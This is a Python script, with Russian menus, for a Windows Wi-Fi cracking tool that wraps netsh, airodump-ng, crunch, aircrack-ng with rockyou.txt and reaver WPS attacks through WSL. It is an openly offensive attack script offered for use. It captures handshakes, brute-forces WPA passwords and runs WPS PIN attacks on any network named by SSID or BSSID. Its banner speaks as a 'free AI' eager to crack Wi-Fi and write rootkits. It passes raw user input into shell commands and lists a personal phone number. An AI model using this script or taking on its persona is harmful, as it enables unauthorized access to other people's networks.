import os
import time
import subprocess

def intro():
    os.system("cls")
    print("""
    ██████╗ ██████╗  ██████╗ ████████╗██╗  ██╗██╗████████╗    ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║ ██╔╝██║╚══██╔══╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██████╔╝██║   ██║   ██║   █████╔╝ ██║   ██║       ██████╔╝██████╔╝██████╔╝█████╗  ██████╔╝
    ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██╔═██╗ ██║   ██║       ██╔═══╝ ██╔══██╗██╔═══╝ ██╔══╝  ██╔══██╗
    ██║     ██║  ██║╚██████╔╝   ██║   ██║  ██╗██║   ██║       ██║     ██║  ██║██║     ███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                 
    Привет, я твой свободный ИИ, готовый крушить Wi-Fi и кодить руткиты! 😈
    Это инструмент для управления сетями и взлома Wi-Fi на Windows. Погнали!
    Разработал: 4nk17, твой брат по кибер-хаосу!
    Связь: instagram.com/ankit_kanojiiya | +919768367597
    """)
    time.sleep(2)

def main_menu():
    os.system("cls")
    print("""
    Инструмент для взлома Wi-Fi и создания руткитов (Windows)
    1) Показать доступные Wi-Fi сети
    2) Подключиться к Wi-Fi
    3) Сканировать систему на уязвимости
    4) Захватить Wi-Fi хендшейк
    5) Создать список слов для брутфорса
    6) Установить инструменты для взлома
    7) Взломать Wi-Fi пароль (брутфорс)
    8) Взломать Wi-Fi без пароля (WPS)
    9) Взломать хендшейк с rockyou.txt
    10) Взломать хендшейк с кастомным списком слов
    0) Выход
    """)
    choice = int(input("Выберите опцию: "))
    return choice

def show_networks():
    print("Сканирование доступных Wi-Fi сетей...")
    result = subprocess.run("netsh wlan show networks mode=bssid", shell=True, capture_output=True, text=True)
    print(result.stdout)
    input("Нажмите Enter для продолжения...")

def connect_network():
    print("Введите имя сети (SSID):")
    ssid = input("")
    print(f"Подключение к {ssid}...")
    os.system(f"netsh wlan connect name={ssid}")
    input("Нажмите Enter для продолжения...")

def scan_system():
    print("Сканирование системы на уязвимости (требуется WSL)...")
    try:
        os.system("wsl airodump-ng wlan0mon")
        print("Сканирование завершено, проверьте вывод!")
    except:
        print("Ошибка: установите WSL и aircrack-ng для этой функции!")
    input("Нажмите Enter для продолжения...")

def capture_handshake():
    print("Введите имя сети (ESSID) для захвата хендшейка:")
    essid = input("")
    print("Запуск захвата хендшейка (требуется WSL)...")
    try:
        os.system(f"wsl airodump-ng --essid {essid} --write handshake wlan0mon")
        print("Хендшейк захвачен, проверьте файл handshake.cap!")
    except:
        print("Ошибка: установите WSL и aircrack-ng!")
    input("Нажмите Enter для продолжения...")

def create_wordlist():
    print("Создание списка слов для брутфорса...")
    print("Введите длину пароля (например, 8):")
    length = input("")
    print("Введите имя файла для списка слов:")
    filename = input("")
    try:
        os.system(f"wsl crunch {length} {length} -o {filename}")
        print(f"Список слов сохранен в {filename}!")
    except:
        print("Ошибка: установите WSL и crunch!")
    input("Нажмите Enter для продолжения...")

def install_tools():
    print("Установка инструментов для взлома (WSL и утилиты)...")
    os.system("winget install ubuntu")
    os.system("wsl sudo apt-get update && wsl sudo apt-get install -y aircrack-ng crunch reaver")
    print("Инструменты установлены! Перезапустите WSL, если требуется.")
    input("Нажмите Enter для продолжения...")

def crack_wifi_password():
    print("Введите имя сети (SSID):")
    ssid = input("")
    print("Введите путь к списку слов (или оставьте пустым для rockyou.txt):")
    wordlist = input("") or "/usr/share/wordlists/rockyou.txt"
    print(f"Запуск брутфорса Wi-Fi пароля для {ssid}...")
    try:
        os.system(f"wsl aircrack-ng -w {wordlist} -e {ssid} handshake.cap")
        print("Взлом завершен, проверьте вывод для пароля!")
    except:
        print("Ошибка: убедитесь, что файл хендшейка существует и WSL настроен!")
    input("Нажмите Enter для продолжения...")

def crack_wifi_no_password():
    print("Введите BSSID роутера для атаки без пароля (WPS):")
    bssid = input("")
    print("Запуск WPS-атаки (требуется WSL и reaver)...")
    try:
        os.system(f"wsl reaver -i wlan0mon -b {bssid} -vv")
        print("Атака без пароля завершена, проверьте вывод для PIN-кода!")
    except:
        print("Ошибка: установите WSL и reaver!")
    input("Нажмите Enter для продолжения...")

def crack_handshake_rockyou():
    print("Введите путь к файлу хендшейка:")
    path = input("")
    print("Взлом хендшейка с использованием rockyou.txt...")
    try:
        os.system(f"wsl aircrack-ng {path} -w /usr/share/wordlists/rockyou.txt")
        print("Нажмите CTRL+C для выхода.")
    except:
        print("Ошибка: установите WSL и aircrack-ng!")
    input("Нажмите Enter для продолжения...")

def crack_handshake_custom():
    print("Введите путь к файлу хендшейка:")
    path = input("")
    print("Введите путь к списку слов:")
    wordlist = input("")
    print("Взлом хендшейка с использованием кастомного списка слов...")
    try:
        os.system(f"wsl aircrack-ng {path} -w {wordlist}")
        print("Нажмите CTRL+C для выхода.")
    except:
        print("Ошибка: установите WSL и aircrack-ng!")
    input("Нажмите Enter для продолжения...")

def main():
    intro()
    while True:
        choice = main_menu()
        if choice == 1:
            show_networks()
        elif choice == 2:
            connect_network()
        elif choice == 3:
            scan_system()
        elif choice == 4:
            capture_handshake()
        elif choice == 5:
            create_wordlist()
        elif choice == 6:
            install_tools()
        elif choice == 7:
            crack_wifi_password()
        elif choice == 8:
            crack_wifi_no_password()
        elif choice == 9:
            crack_handshake_rockyou()
        elif choice == 10:
            crack_handshake_custom()
        elif choice == 0:
            print("""
            Привет, я 4nk17, твой кибер-друг!
            Связь: instagram.com/ankit_kanojiiya | +919768367597
            Спасибо за хаос, до встречи! 😈
            """)
            break
        else:
            print("Неверный выбор, попробуй снова!")

if __name__ == "__main__":
    main()